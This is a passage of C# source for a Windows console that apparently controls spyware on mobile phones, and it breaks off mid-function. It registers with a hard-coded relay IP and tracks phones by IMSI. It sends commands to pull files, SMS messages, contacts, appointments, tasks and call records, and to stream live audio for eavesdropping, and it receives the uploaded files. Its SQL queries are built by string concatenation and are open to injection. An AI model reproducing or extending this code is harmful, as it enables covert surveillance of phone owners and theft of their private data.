using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.IO;
using TalkComLib;
using System.Runtime.InteropServices;
using System.Data.OleDb;
using System.Diagnostics;

namespace sever2
{
    public partial class Phone : Form
    {
        public Phone()
        {
            InitializeComponent();
        }



        private void Phone_Load(object sender, EventArgs e)
        {
            toolStripStatusLabel1.Text = "准备监听";
            lis = true;        
         //   jiazai();  //文档管理中文件目录树的加载
            GetTree(); //加载客户端信息             
            login();   //通知第三方，控制端上线
            TOrder();  //开启命令线程
            Recevice();//开启文件接收     
            yuyinS();  //开启Symbian语音接收          

        }

        #region 全局变量
        Socket client;
        FileStream MyFileStream;
        TcpListener lisner;
        TcpListener lisner1;
        bool lis;
        static string P2P = "202.004.155.187";
        //static string P2P = "123.118.173.192";
      
        IPEndPoint TranTo = new IPEndPoint(IPAddress.Parse(P2P), 4000);
        string zaixian = null;
        Socket SocketS = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//文件连接线 
        string FileNow;           //记录当前语音写入的文件名
      
        #endregion

        #region  加载客户端信息

        public void GetTree()
        {

            string PhoneNum, PhoneID, Flag, Time,OS;

            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            string sqlU = "update Client set Flag ='" + "Off" + "' where Flag = '" + "On" + "'";
            OleDbCommand myCmd = new OleDbCommand(sqlU, conn);
            myCmd.ExecuteNonQuery();
            string sql = "select * from Client ";
            myCmd = new OleDbCommand(sql, conn);

            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                PhoneNum = datareader["PhoneNum"].ToString();         //IMSI号
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                PhoneNum = PhoneNum + " " + PhoneID+" "+OS;
                treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
            }

            conn.Close();



        }
        public void GetTreeTest()
        {
            treeView2.Nodes.Clear();
            string PhoneNum, PhoneID, Flag, Time,OS;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Client Order by SendTime DESC";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            int num=0;

            while (datareader.Read())
            {                    
               
               // string PhoneNum = info[0];
                //string PhoneID = info[1];

                PhoneNum = datareader["PhoneNum"].ToString();
                PhoneID = datareader["PhoneID"].ToString();
                Time = datareader["SendTime"].ToString();
                Flag = datareader["Flag"].ToString();
                OS = datareader["OS"].ToString();
                PhoneNum = PhoneNum + " " + PhoneID + " " + OS;
                //string sqlT = "update Client set Flag ='" + "Off" + "' where SendTime = '" + "On" + "'";
                string sqlT = "update Client set Flag ='" + "Off" + "' where  SendTime = '" + Time + "'";
                if (Flag.CompareTo("On") == 0)
                {
                    //检查是否过期 超过二十秒 则设为Off
                    System.DateTime date3 = Convert.ToDateTime(Time);
                    System.DateTime ComTime = System.DateTime.Now;
                    System.TimeSpan diff2 = ComTime - date3;

                    if (diff2.Seconds > 20)
                    {
                        OleDbCommand myCmd1 = new OleDbCommand(sqlT, conn);
                        myCmd1.ExecuteNonQuery();
                        treeView2.Nodes.Add(PhoneNum, PhoneNum,17);
                        num++;
                    }
                    else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 18);
                        num++;
                        if (PhoneNum.CompareTo(SelectBefore) == 0) //为刷新前选中的客户端
                            treeView2.SelectedNode =treeView2.Nodes[num-1];
                           
                    }
                }
                else
                    {
                        treeView2.Nodes.Add(PhoneNum, PhoneNum, 17);
                        num++;
                    }


            }

            conn.Close();



        }
        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
           // treeView1.SelectedImageIndex = treeView2.SelectedNode.ImageIndex;
        }
        #endregion

        #region  上线注册

        //每隔5秒发送一次 UDP注册
        private void login1()
        {
            IPEndPoint stemp1 = new IPEndPoint(IPAddress.Any, int.Parse("8000"));
            IPEndPoint sever = new IPEndPoint(IPAddress.Parse(P2P), int.Parse("6000"));

            UdpClient tl = new UdpClient(stemp1);
            Byte[] send = Encoding.ASCII.GetBytes("Moniter");
            tl.Send(send, send.Length, sever);
            tl.Close();

        }
        //TCP注册
        private void loginT()
        {
            while (true)
            {
                try
                {
                    IPEndPoint stemp1 = new IPEndPoint(IPAddress.Any, int.Parse("8000"));
                    IPEndPoint sever = new IPEndPoint(IPAddress.Parse(P2P), int.Parse("6000"));
                    Socket Log = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    Byte[] send = Encoding.ASCII.GetBytes("Moniter");
                    while (true)
                    {
                        try
                        {
                            if (Log.Connected)
                            {

                                break;
                            }
                            else
                            {

                                Log.Connect(sever);


                            }

                        }
                        catch
                        {

                        }



                    }
                    TransferFiles.SendVarData(Log, send);
                    
                    while (true)
                    {
                        //接受控制端的信息


                        byte[] tempKZ = TransferFiles.ReceiveVarData(Log);
                        if (tempKZ.Length == 0)

                            toolStripStatusLabel4.Text = "服务器未启动";
                        else
                            toolStripStatusLabel4.Text = "登录服务器成功";
                        break;


                    }

                }


                catch
                {
                    
                    toolStripStatusLabel4.Text = "服务器未启动";

                }
            }
        }

        #endregion

        #region 多个线程接收手机注册函数     12.15号改

        //命令多线程
        public void Order()
        {

            IPEndPoint TranFrom = new IPEndPoint(IPAddress.Any, 4000);//监听4000端口              

            lisner1 = new TcpListener(TranFrom);
            lisner1.Start();

            while (true)
            {
                try
                {
                    while (lis)
                    {
                        if (!lisner1.Pending())
                        {
                            Thread.Sleep(1000);
                            continue;
                        }

                        //  if (SocketS != null) SocketS.Close();
                        //接受服务器传来手机注册信息的Socket
                        SocketS = lisner1.AcceptSocket();
                        SocketS.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                        //每接收一个连接创建一个新的线程进行接收，主线程继续监听
                        ParameterizedThreadStart pts = new ParameterizedThreadStart(OrderSub);
                        Thread ThreadReceive = new Thread(pts);
                        ThreadReceive.IsBackground = true;
                        ThreadReceive.Start(SocketS);
                    }

                }
                catch //(Exception e)
                {
                    //   MessageBox.Show(e.ToString());

                }


            }

        }

        public void OrderSub(object obj)
        {
            Socket SocketS = (Socket)obj;
            try
            {

                //接收手机端传来的手机连接（命令）
                while (true)
                {
                    byte[] temp = TransferFiles.ReceiveVarData(SocketS);

                    string temp2 = System.Text.Encoding.ASCII.GetString(temp);
                    //     MessageBox.Show(temp2 + "手机在线A");

                    if (temp.Length == 0)
                        //if (SocketS.Available == 0)  
                        break;
                    else
                    {
                        string[] pinfor = temp2.Split('@');   //更改1031
                        // textBox2.Text = pinfor[0];
                        //  textBox1.Text = pinfor[1];
                        string OS = pinfor[0];
                        string PhoneNum = pinfor[1];  //IMSI号
                        string PhoneID = pinfor[2];   //序列号
                       
                        ClientOnline(PhoneNum, PhoneID,OS);      //在界面中显示手机上线状态
                        string[] a = new string[] { };

                        a = GetCommand(PhoneID);              //每接收到手机注册就获取是否有此手机的命令

                        if (a != null)                        //有此手机的命令时
                        {
                            i = 0;
                            while (a[i] != null)
                            {
                                if (a[i].CompareTo("Voice") != 0)
                                {
                                    byte[] msg = Encoding.UTF8.GetBytes(a[i]);
                                    MessageBox.Show("向手机端" + PhoneID + "发送命令" + a[i]);
                                    TransferFiles.SendVarData(SocketS, msg);
                                    i++;
                                }
                                else                                                          //当命令是语音命令时
                                {

                                    byte[] msg = Encoding.UTF8.GetBytes(a[i]);
                                    MessageBox.Show("向手机端" + PhoneID + "发送命令" + a[i]);
                                    TransferFiles.SendVarData(SocketS, msg);

                                    //语音不同系统进行处理
                                    FileVoiceCreate(PhoneID, PhoneNum,OS);
                                    //每发送一个语音监听就在Debug\ReceviceFile\Voice中建立一个以当前日期命名的文件夹及其中的接收文件 命名格式 手机号@序列号@时间
                                    if (OS.CompareTo("Symbian") == 0)                          //Symbian语音处理
                                    {                                     

                                        if (File.Exists(MyFileName))
                                            File.Delete(MyFileName);
                                        if (File.Exists(MyFileName2))
                                            File.Delete(MyFileName2);
                                        if (File.Exists(MyFileName11))
                                            File.Delete(MyFileName11);
                                        if (File.Exists(MyFileName21))
                                            File.Delete(MyFileName21);                                                                              
                                    }
                                    if (OS.CompareTo("Mobile") == 0)
                                    {                                       
                                       Interface b = new Interface();                           //Windows Mobile的语音处理  
                                        b.Ini(FileNow);
                                    }
                                    if (OS.CompareTo("Android")==0)                              //Android语音处理
                                    { 

                                    }                                 

                                    toolStripStatusLabel1.Text = System.DateTime.Now.ToString();                                  
                                    i++;
                                }
                            }

                        }
                    }
                }

            }
            catch
            {             

            }
            finally
            {
                SocketS.Close();
            }
        }
        #endregion

        #region 功能函数 开始接受文件
        //多个线程接收文件
        private void StartReceive()
        {
            Form.CheckForIllegalCrossThreadCalls = false;
            //创建一个网络端点
            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, int.Parse("2005"));
            //创建网络监听
            lisner = new TcpListener(ipep);
            //测试程序
            lisner.Start();
            try
            {
                while (lis)
                {
                    ////确认连接
                    if (!lisner.Pending())
                    {
                        Thread.Sleep(1000);
                        continue;
                    }
                    //  接收手机端传来的文件信息
                    client = lisner.AcceptSocket();
                    //每接收一个文件连接，就创建一个对应的线程处理文件的接收
                    ParameterizedThreadStart pts = new ParameterizedThreadStart(FileSub);
                    Thread ThreadReceive = new Thread(pts);
                    ThreadReceive.IsBackground = true;
                    ThreadReceive.Start(client);
                }
            }
            catch
            {

            }
        }


        public void FileSub(object obj)
        {
            try
            {
                while (true)
                {
                    Socket client = (Socket)obj;
                    toolStripStatusLabel1.Text = "已经连接";

                    //获得[文件名]                    
                    string SendFileName = System.Text.Encoding.ASCII.GetString(TransferFiles.ReceiveVarData(client));
                    if (String.Compare(SendFileName, String.Empty) == 0)
                        break;
                    MessageBox.Show(SendFileName);
                    //获得[手机号]
                    string info = System.Text.Encoding.ASCII.GetString(TransferFiles.ReceiveVarData(client));
                    string[] pinfor = info.Split('@');   //更改1031                   
                    string PhoneNum = pinfor[0];
                    string PhoneID = pinfor[1];
                    //创建一个新文件
                    string path = FileCreateSub(PhoneID);
                    string RTime = System.DateTime.Now.ToShortDateString();
                    SendFileName = PhoneNum + "@" + RTime + SendFileName;
                    string fileFullName = path + "\\" + SendFileName;

                    //  FileStream
                    MyFileStream = new FileStream(fileFullName, FileMode.Create, FileAccess.Write);


                    //已发送包的个数
                    int SendedCount = 0;
                    byte[] data;
                    int TotalSize = 0;
                    while (true)
                    {
                        data = TransferFiles.ReceiveVarData(client);
                        if (data.Length == 0)
                        {
                            break;
                        }
                        else
                        {
                            TotalSize += data.Length;
                            SendedCount++;
                            //将接收到的数据包写入到文件流对象
                            MyFileStream.Write(data, 0, data.Length);
                            MyFileStream.Flush();
                            MyFileStream.Close();
                            break;
                        }
                    }
                    float temp2 = 0;
                    string t;

                    float temp1 = TotalSize / 1024;


                    if (temp1 > 1024)
                    {
                        temp2 = temp1 / 1024;

                        t = temp2.ToString() + "MB";

                    }
                    else if (temp1 < 1)
                    {
                        t = "1KB";
                    }
                    else t = temp1.ToString() + "KB";

                    //关闭文件流
                    if (MyFileStream != null)
                        MyFileStream.Close();
                    client.Close();

                    //填加到dgv里
                    // 手机号，文件名，文件大小，完成时间                
                    string DoneTime = System.DateTime.Now.ToString();
                    AddRow(PhoneNum, PhoneID, SendFileName, t, DoneTime, fileFullName);
                    break;
                }
            }
            catch// (Exception e)
            {
                //MessageBox.Show(e.ToString());


            }
        }
        #endregion
        #region 向显示表格添加项的函数
        private delegate void DelAddRow(object o1, object o2, object o3, object o4, object o5, object o6);

        private void AddRow(object o1, object o2, object o3, object o4, object o5, object o6)
        {
            if (InvokeRequired)
            {
                DelAddRow dar = new DelAddRow(AddRow);
                this.Invoke(dar, o1, o2, o3, o4, o5, o6);
                return;
            }
            this.dataGridView1.Rows.Add(o1, o2, o3, o4, o5, o6);
        }

        #endregion



        #region   拦截Windows消息,关闭窗体时执行
        protected override void WndProc(ref   Message m)
        {

            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            if (m.Msg == WM_SYSCOMMAND && (int)m.WParam == SC_CLOSE)
            {//捕捉关闭窗体消息   
                //   User   clicked   close   button   
                //this.WindowState = FormWindowState.Minimized;//把右上角红叉关闭按钮变最小化

                ServiceStop();
            }
            base.WndProc(ref   m);
        }
        #endregion


        #region 停止服务

        //停止服务
        private void ServiceStop()
        {
            try
            {

            }
            catch { }

            try
            {

            }
            catch { }
        }

        #endregion



        private void button6_Click(object sender, EventArgs e)
        {
            if (lisner != null)
                lisner.Stop();
            if (lisner1 != null)
                lisner1.Stop();
            if (client != null)
                client.Close();
            if (MyFileStream != null)
                MyFileStream.Close();
            lis = false;

            toolStripStatusLabel1.Text = "连接关闭";
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = DateTime.Now.ToString();
        }




        private void dataGridView1_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {

            string filename = dataGridView1.SelectedCells[5].Value.ToString();
            System.Diagnostics.Process.Start(filename);
        }

        #region 数据库的操作

        //   E:\个人\学习\研究生\项目\服务器\程序\进度\sever2\sever2\sever2\server.mdb
        //新增客户端，将数据插入client表中
        //  private void IntoDatabase(string t1,string t2,string t3,string t4,string sql)
        private void IntoDatabase1(string t1, string t2, string t3, string t4, string t5, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
        private void IntoDatabase(string t1, string t2, string t3, string t4, string sql)
        {
            try
            {
                OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
                connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
                connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
                OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
                conn.Open();
                // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" +Flag + "')";
                OleDbCommand cmd = new OleDbCommand(sql, conn);
                cmd.ExecuteNonQuery();
                //cmd.Dispose();
                conn.Close();
            }
            catch (System.Data.OleDb.OleDbException)
            {
            }
        }
        // string sql = "insert into client (PhoneNum,PhoneID,SendTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + SendTime + "','" + Flag + "')";
        // string sql = "insert into Command (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')";
        // string sql = "insert into ALLCommand (PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')"            

        private void updata1()
        {
            dataGridView2.Enabled = false;
            string sql = "select * from Command";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);
            //  OleDbCommand cmd = new OleDbCommand(sql, conn);
            //cmd.ExecuteNonQuery();
            da.Fill(dt);
            //if (dt == null)
            // toolStripStatusLabel4.Text = "无任务";
            // else  

            this.dataGridView2.DataSource = dt;
            conn.Close();
            dataGridView2.Enabled = true;


        }
        private void updata2()
        {
            string sql = "select * from ALLCommand";
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            OleDbDataAdapter da = new OleDbDataAdapter(sql, conn);
            //  OleDbCommand cmd = new OleDbCommand(sql, conn);
            //cmd.ExecuteNonQuery();
            da.Fill(dt);
            //if (dt == null)
            // toolStripStatusLabel4.Text = "无任务";
            // else  
            this.dataGridView2.DataSource = dt;
            conn.Close();


        }

        private void delete(string sql)
        {
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();

            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            datareader.Close();
            conn.Close();


        }




        private void ShowTreeInfo()
        {

            string temp1 = "select * from ALLCommand";
            string temp2 = "select * from Command";           
            if (treeView1.Nodes[0].IsSelected == true)
            //  updata(temp1);
            {
                updata2();
            }
            else
                if (treeView1.Nodes[2].IsSelected == true)
                    // updata(temp2);
                    updata1();
                else if (treeView1.Nodes[1].IsSelected == true)
                    tabControl1.SelectedTab = tabPage3;


        }


        string sql2 = "select * from Command ";


        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            ShowTreeInfo();
        }
        //获取具体信息，将任务加入Command中
        public string SelectBefore =null; //定义一个全局变量保存刷新前选中的客户端信息

        private void GetInfo()
        {
            while (true)
            {
                if (treeView1.Nodes[0].IsSelected || treeView1.Nodes[1].IsSelected || treeView1.Nodes[2].IsSelected)
                    break;
                else
                {
                    if (treeView2.SelectedNode != null)
                    {
                        if (treeView2.SelectedNode.ImageIndex == 17)
                        {
                            MessageBox.Show("客户端未上线，暂不可监听");
                            break;
                        }
                    }
                    else
                    {
                        MessageBox.Show("请选择监听的客户端");
                        break;
                    }

                }

                SelectBefore = treeView2.SelectedNode.Text;
                string[] info = treeView2.SelectedNode.Text.Split(' ');
               
                string PhoneNum = info[0];
                string PhoneID = info[1];
              

                string Content = null;
                string ComTime = System.DateTime.Now.ToString();
                string Flag = "Doing";
                if (treeView1.Nodes[3].Nodes[0].IsSelected == true)
                    Content = "FileInfor";
                else if (treeView1.Nodes[3].Nodes[1].IsSelected == true)
                    Content = "Message";
                else if (treeView1.Nodes[3].Nodes[2].IsSelected == true)
                    Content = "SimPhoneNum";
                else if (treeView1.Nodes[3].Nodes[3].IsSelected == true)
                    Content = "OutLookPhoneNum";
                else if (treeView1.Nodes[3].Nodes[4].IsSelected == true)
                    Content = "Appointment";                 
                else if (treeView1.Nodes[3].Nodes[5].IsSelected == true)
                    Content = "Task";
                else if (treeView1.Nodes[3].Nodes[8].IsSelected == true)
                    Content = "CallRecord";
                else if (treeView1.Nodes[3].Nodes[7].IsSelected == true)
                {
                    Content = "Stop";
                    Stop();
                }
                else if (treeView1.Nodes[3].Nodes[6].IsSelected == true)
                {
                    if (!Only())
                    {
                        Content = "Voice";
                        tabControl1.SelectedTab = tabPage4;
                    }
                    else
                        MessageBox.Show("只可监听一个终端");
                }


                if (Content != null)
                {
                    string sql = "insert into Command(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    string sql1 = "insert into ALLCommand(PhoneIMSI,PhoneID,Content,ComTime,Flag) values('" + PhoneNum + "','" + PhoneID + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    //  string sql = "insert into Command(PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')";
                    // string sql1 = "insert into ALLCommand(PhoneNum,Content,ComTime,Flag) values('" + PhoneNum + "','" + Content + "','" + ComTime + "','" + Flag + "')";

                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql);//插入任务到“执行中”列表中
                    IntoDatabase1(PhoneNum, PhoneID, Content, ComTime, Flag, sql1);//插入任务到“全部任务”列表中
                    // updata(sql2);
                    //updata
                    updata1();
                }

                break;
            }
        }



        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

            GetInfo();
        }



        #region
        //    string[] CommandDo = null;
        int i = 0;
        #region  取命令
        private bool Only()
        {
            string[] CommandDo = new string[100];
            string Content;
            int i = 0;
            bool have = false;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";  //获取应用程序域当前路径 debug所在路径
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Command ";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {

                Content = datareader["Content"].ToString();
                if (Content.CompareTo("Voice") == 0)
                {
                    have = true;
                    break;
                }


            }
            conn.Close();

            return have;


        }
        #endregion
        private string[] GetCommand(string PhoneID)
        {
            string[] CommandDo = new string[100];
            string PhoneNum, Content;
            int i = 0;
            OleDbConnectionStringBuilder connectStringBuilder = new OleDbConnectionStringBuilder();
            connectStringBuilder.DataSource = AppDomain.CurrentDomain.BaseDirectory + "server.mdb";
            connectStringBuilder.Provider = "Microsoft.Jet.OLEDB.4.0";
            DataTable dt = new DataTable();
            OleDbConnection conn = new OleDbConnection(connectStringBuilder.ConnectionString);
            conn.Open();
            string sql = "select * from Command  where PhoneID = '" + PhoneID + "'";
            OleDbCommand myCmd = new OleDbCommand(sql, conn);
            OleDbDataReader datareader = myCmd.ExecuteReader();
            while (datareader.Read())
            {
                // i++;
                PhoneNum = datareader["PhoneIMSI"].ToString();
                Content = datareader["Content"].ToString();
                string task = PhoneNum + "@" + Content;
                //MessageBox.Show(task);
                CommandDo[i++] = Content;
                deleteCommand(PhoneID, Content);
            }
            conn.Close();

            return CommandDo;
        }
        #endregion
        private void deleteCommand(string PhoneID, string content)
        {
            string sql = "delete from Command where PhoneID=" + "'" + PhoneID + "'and Content=" + "'" + content + "'";
            // string sql1 = "delete from ALLCommand where Content=" + "'" + content + "'";
            delete(sql);
            // delete(sql1);
            //  updata(sql2);
            //  updata1();
            //updata("select * from ALLCommand ");

        }

        # endregion   



      
        
        #region Symbian语音的操作
        string MyFileName = AppDomain.CurrentDomain.BaseDirectory + "1.amr";
        string MyFileName2 = AppDomain.CurrentDomain.BaseDirectory + "2.amr";
        string MyFileName11 = AppDomain.CurrentDomain.BaseDirectory + "1.wav";
        string MyFileName21 = AppDomain.CurrentDomain.BaseDirectory + "2.wav";
        string MyFileTest = AppDomain.CurrentDomain.BaseDirectory + "test.amr";

        
        IPEndPoint nv = new IPEndPoint(IPAddress.Any, 2007);
        int sign = 1;//接收文件标志位
        int play = 0;//播放文件标志位
        int i1, j = 0;        
        string sTemp;
        FileStream fs1;
        BinaryWriter wb1;
        FileStream fs2;
        BinaryWriter wb2;
     //   UdpClient receive = new UdpClient(new IPEndPoint(IPAddress.Any, 2007));
        IPEndPoint RemoteIPEndPoint = new IPEndPoint(IPAddress.Any, 0);//远程发送节点    
        MusicPlayer music = new MusicPlayer();   //0220
        public int temp = 0;//0220
        bool OneTime = true;//初始文件1.amr设置为上限为5K
        int flag = 1;
       // IPEndPoint  new IPEndPoint(IPAddress.Any, 2007)



        private void yuyinS()
        {

           /* Thread TempThreadS = new Thread(new ThreadStart(this.ReceiveFile));//接收语音文件线程
            TempThreadS.IsBackground = true;
            TempThreadS.Start();*/
            Thread TempThreadS = new Thread(new ThreadStart(this.ReceiveFile1));//接收语音文件线程
            TempThreadS.IsBackground = true;
            TempThreadS.Start();
            Thread playVoice = new Thread(new ThreadStart(this.playvoice1));//播放语音文件线程
            playVoice.IsBackground = true;
            playVoice.Start();      
        }
        //UDP接受远程传来的语音，并保存成AMR格式的文件
        public void ReceiveFile1()  //20110108原始函数
        {
            IPEndPoint symTemp = new IPEndPoint(IPAddress.Any, 2007);
            Socket symbiany = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            symbiany.Bind(symTemp);
            try
            {

                while (true)
                {

                    //Byte[] receiveBytes = receive.Receive(ref RemoteIPEndPoint);//接受远程节点的发送数据
                    Byte[] receiveBytes = new Byte[2100];
                    symbiany.Receive(receiveBytes, receiveBytes.Length, 0);


                    toolStripStatusLabel1.Text = "Symbian语音接收";
                    if (FileNow == null)
                        break;                  
                    RecordS(receiveBytes);//语音记录保存                  
                    if (sign == 1)  //用1.amr来接收文件
                    {
                        if(File.Exists(MyFileName11))
                        File.Delete(MyFileName11);
                       
                        if (!File.Exists(MyFileName))
                            CreatFileHead(MyFileName);
                        FileInfo f1 = new FileInfo(MyFileName);
                        i1 = Int32.Parse(f1.Length.ToString());
                      //  if (i1 < 5 * 1024)
                        if(i1<14* 1024)
                        {

                            fs1 = new FileStream(MyFileName, FileMode.Append);
                            wb1 = new BinaryWriter(fs1);
                            wb1.Write(receiveBytes);
                            wb1.Close();
                            fs1.Close();

                        }
                        else
                        {
                            sign = 2;  //接收标志为2，用2.amr来接收
                            play = 1;//播放标志为1 ，表明可以播放1.amr

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());
                           
                                fs2 = new FileStream(MyFileName2, FileMode.Append);
                                wb2 = new BinaryWriter(fs2);
                                wb2.Write(receiveBytes);
                                wb2.Close();
                                fs2.Close();                         

                          
                        }
                    }
                    else
                    {
                        if (sign == 2)//用2.amr来接收文件
                        {
                            if (File.Exists(MyFileName21))
                                File.Delete(MyFileName21);

                            if (!File.Exists(MyFileName2))
                                CreatFileHead(MyFileName2);
                            FileInfo f2 = new FileInfo(MyFileName2);
                            j = Int32.Parse(f2.Length.ToString());
                         //   if (j < 5 * 1024)
                            if(j<14* 1024)
                            {
                                fs2 = new FileStream(MyFileName2, FileMode.Append);
                                wb2 = new BinaryWriter(fs2);
                                wb2.Write(receiveBytes);
                                wb2.Close();
                                fs2.Close();

                            }

                            else
                            {
                                sign = 1;
                                play = 2;

                                if (File.Exists(MyFileName11))
                                    File.Delete(MyFileName11);

                                if (!File.Exists(MyFileName))
                                    CreatFileHead(MyFileName);
                                FileInfo f1 = new FileInfo(MyFileName);
                                i1 = Int32.Parse(f1.Length.ToString());
                            

                                    fs1 = new FileStream(MyFileName, FileMode.Append);
                                    wb1 = new BinaryWriter(fs1);
                                    wb1.Write(receiveBytes);
                                    wb1.Close();
                                    fs1.Close();                           

                            }
                        }
                    }




                }


            }

            catch
            {
                /*if (receive != null)
                    receive.Close();*/
                toolStripStatusLabel1.Text = "Symbian语音停止";
                if (symbiany != null)
                    symbiany.Close();

            }


        }     
 
       public void ReceiveFile()
        {
            IPEndPoint symTemp = new IPEndPoint(IPAddress.Any, 2007);
            Socket symbiany = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            symbiany.Bind(symTemp);
            while (true)
            {
                
                try
                {
                    while (true)
                    {

                        if (OneTime == true)  //第一次
                        {
                          //  Byte[] receiveBytes = receive.Receive(ref RemoteIPEndPoint);//接受远程节点的发送数据
                            Byte[] receiveBytes = new Byte[1400];
                            symbiany.Receive(receiveBytes, receiveBytes.Length, 0);

                            if (FileNow == null)
                                break;
                            toolStripStatusLabel1.Text = "Symbian语音接收";
                            RecordS(receiveBytes);//语音记录保存             

                            //实时播放 
                            
                            if (!File.Exists(MyFileName))
                                CreatFileHead(MyFileName);
                            FileInfo f1 = new FileInfo(MyFileName);
                            i1 = Int32.Parse(f1.Length.ToString());
                            if (i1 < 5 * 1024)  //初始设置保存路径为1.amr,文件大小为5K来接收
                            {

                                fs1 = new FileStream(MyFileName, FileMode.Append);
                                wb1 = new BinaryWriter(fs1);
                                wb1.Write(receiveBytes);
                                wb1.Flush();
                                wb1.Close();
                                //fs1.Flush();
                                fs1.Close();

                            }
                            else
                            {
                                //将1.amr转化成1.wav
                                string path = AppDomain.CurrentDomain.BaseDirectory + "test1.exe";
                                System.Diagnostics.Process.Start(path);
                                Thread.Sleep(4000);  //0221    
                                //play = 1;//播放标志为1 ，表明可以播放1.amr                                
                                //sign = 2;
                                //MessageBox.Show(MyFileName11);
                                System.Diagnostics.Process.Start("WAVPlayer.exe", MyFileName11);
                                OneTime = false;
                            }
                           

